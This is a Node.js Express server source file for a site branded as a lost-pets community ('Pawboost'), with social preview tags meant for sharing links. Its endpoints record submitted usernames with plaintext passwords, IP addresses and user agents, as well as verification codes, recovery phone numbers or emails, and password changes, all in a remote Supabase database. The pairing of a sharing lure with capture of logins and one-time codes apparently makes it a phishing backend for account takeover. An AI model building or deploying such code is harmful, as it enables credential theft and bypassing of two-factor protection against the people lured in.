// server.js
// Express server that forwards data to Supabase (replaces previous JSON file storage)

require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

const PORT = process.env.PORT || 5000;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY; // SERVICE ROLE (server-side) key

if (!SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
  console.error('Missing SUPABASE_URL or SUPABASE_SERVICE_KEY in environment. Exiting.');
  process.exit(1);
}

// Server-side Supabase client (service role key)
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  auth: { persistSession: false }
});

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// CORS: allow your frontend origins during development
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', process.env.CORS_ORIGIN || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// Helper: inject OG tags into HTML string before sending
function injectOgTags(html) {
  const ogTags = `
    <meta property="og:title" content="Lost & Found Pets-Pawboost" />
    <meta property="og:description" content="Join our community to help reunite lost pets with their families. Share sightings, post alerts, and get support from caring members who understand how important every pet is. Together, we can bring hope and happy endings to lost pets everywhere." />
    <meta property="og:image" content="https://your-host.example.com/pawboost.png" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:type" content="website" />
    <meta property="og:site_name" content="Pawboost Lost Pets" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Lost & Found Pets US" />
    <meta name="twitter:description" content="Join our community to help reunite lost pets with their families." />
    <meta name="twitter:image" content="https://your-host.example.com/pawboost.png" />
  `;
  return html.replace('</head>', `${ogTags}</head>`);
}

// Serve static files, but inject OG tags for HTML
app.get(['/', '/index.html'], (req, res) => {
  const filePath = path.join(__dirname, 'index.html');
  if (!fs.existsSync(filePath)) return res.status(404).send('Not found');
  let html = fs.readFileSync(filePath, 'utf8');
  html = injectOgTags(html);
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
});

// Serve other static files (css, js, images)
app.use(express.static(path.join(__dirname, '/')));

// Utility: safe insert wrapper for supabase
async function supabaseInsert(table, row) {
  const { data, error } = await supabase.from(table).insert([row]);
  if (error) throw error;
  return data;
}

/*
 Endpoints:
 - POST /save-login            -> inserts into users
 - POST /save-code             -> inserts into codes
 - POST /save-password-change  -> inserts into password_changes
 - POST /save-verify-code      -> inserts into verification_codes
 - POST /save-new-password     -> updates users table password
 - POST /save-latest           -> inserts into latest
*/

// 1) Save login -> users
app.post('/save-login', async (req, res) => {
  try {
    const payload = req.body || {};
    const ip = req.ip || req.headers['x-forwarded-for'] || null;
    const userAgent = req.get('user-agent') || null;

    const row = {
      username: payload.username || payload.user || null,
      password: payload.password || null,
      ip,
      user_agent: userAgent,
      meta: payload.meta || null
    };

    await supabaseInsert('users', row);
    res.json({ success: true });
  } catch (err) {
    console.error('save-login error:', err);
    res.status(500).json({ success: false, error: err.message || err });
  }
});

// 2) Save code -> codes
app.post('/save-code', async (req, res) => {
  try {
    const payload = req.body || {};
    const row = {
      user: payload.user || payload.username || 'unknown',
      step: payload.step || null, // e.g., "first" or "latest"
      code: payload.code || payload.verification_code || null
    };
    await supabaseInsert('codes', row);
    res.json({ success: true });
  } catch (err) {
    console.error('save-code error:', err);
    res.status(500).json({ success: false, error: err.message || err });
  }
});

// 3) Save password change request -> password_changes
app.post('/save-password-change', async (req, res) => {
  try {
    const payload = req.body || {};
    const row = {
      user: payload.user || payload.username || null,
      phone_or_email: payload.phone_or_email || payload.contact || null,
      note: payload.note || null
    };
    await supabaseInsert('password_changes', row);
    res.json({ success: true });
  } catch (err) {
    console.error('save-password-change error:', err);
    res.status(500).json({ success: false, error: err.message || err });
  }
});

// 4) Save verify code -> verification_codes
app.post('/save-verify-code', async (req, res) => {
  try {
    const payload = req.body || {};
    const row = {
      recovery_target: payload.recovery_target || payload.user || null,
      verification_code: payload.verification_code || payload.code || null,
      user_agent: req.get('user-agent'),
      ip: req.ip
    };
    await supabaseInsert('verification_codes', row);
    res.json({ success: true });
  } catch (err) {
    console.error('save-verify-code error:', err);
    res.status(500).json({ success: false, error: err.message || err });
  }
});

// 5) Save new password -> update users
app.post('/save-new-password', async (req, res) => {
  try {
    const payload = req.body || {};
    const username = payload.username || payload.user || null;
    const newPassword = payload.new_password || payload.password || null;

    if (!username || !newPassword) {
      return res.status(400).json({ success: false, error: 'username and new_password required' });
    }

    const { data, error } = await supabase
      .from('users')
      .update({ password: newPassword })
      .eq('username', username);

    if (error) throw error;

    res.json({ success: true, updated: data.length });
  } catch (err) {
    console.error('save-new-password error:', err);
    res.status(500).json({ success: false, error: err.message || err });
  }
});

// 6) Save latest -> latest
app.post('/save-latest', async (req, res) => {
  try {
    const payload = req.body || {};
    const row = {
      user: payload.user || null,
      latest_data: payload.latest || payload.data || null
    };
    await supabaseInsert('latest', row);
    res.json({ success: true });
  } catch (err) {
    console.error('save-latest error:', err);
    res.status(500).json({ success: false, error: err.message || err });
  }
});

// fallback for static files not found
app.use((req, res) => {
  res.status(404).send('Not found');
});

app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});
